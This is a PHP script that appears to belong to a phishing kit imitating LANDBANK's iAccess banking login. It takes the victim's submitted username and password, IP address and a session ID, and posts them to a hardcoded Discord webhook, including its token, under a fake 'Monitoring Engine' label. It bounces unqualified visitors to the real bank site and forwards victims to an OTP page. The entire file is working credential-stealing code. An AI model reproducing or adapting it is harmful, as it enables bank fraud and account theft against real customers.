<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', '0');
set_time_limit(0);
date_default_timezone_set('Asia/Manila');

session_start();
$_SESSION["y"] = '';
if(empty($_SESSION["x"]) ){
    session_destroy();
    session_unset();
    header("Location: https://www.landbank.com/about-us");
    die();
}

$ip = $_SERVER['REMOTE_ADDR'];
$status = "Attempted Login";

$_SESSION['username'] = $_POST['loginid'];
$_SESSION['password'] = $_POST['uipassword'];

$username = $_POST['loginid'];
$password = $_POST['uipassword'];

$webhookurl = "https://discord.com/api/webhooks/1394689160601669787/pkXOqqZSsh_2R_AZlpknUH5qxFWuHp2SKy0DtGT-AOYvIKCXOdajFmCeUtNbQsFD5bqI";

$payload = json_encode([
    "username" => "🌐 LBP iAccess Monitoring",
    "avatar_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7P4CpxuhkmnaABwQq791Zn5Ci2N1ZTT5JKw&s",
    "embeds" => [[
        "title" => "📝 New Login Attempt",
        "description" => 
        "```md\n# A visitor attempted to access the system\n\n" . "```".
        
             "```\nIP Address :     $ip```".
             
             "```\nUsername   :     $username
                 \nPassword   :     $password```".
                 
             "```\nStatus     :     $status```".
             "```\nSSS ID     :     ".$_SESSION["x"]."\n```",
             
        "color" => 0xf1c40f, // Yellow
        "footer" => [
                    "text" => "LBP iAccess • Monitoring Engine",
                    "icon_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7P4CpxuhkmnaABwQq791Zn5Ci2N1ZTT5JKw&s"
                ],
                "timestamp" => date("c")
    ]]
]);

$options = [
    'http' => [
        'header'  => "Content-Type: application/json\r\n",
        'method'  => 'POST',
        'content' => $payload,
    ]
];

$context = stream_context_create($options);
@file_get_contents($webhookurl, false, $context);

// redirect
header("Location: otp.php");
exit;
?>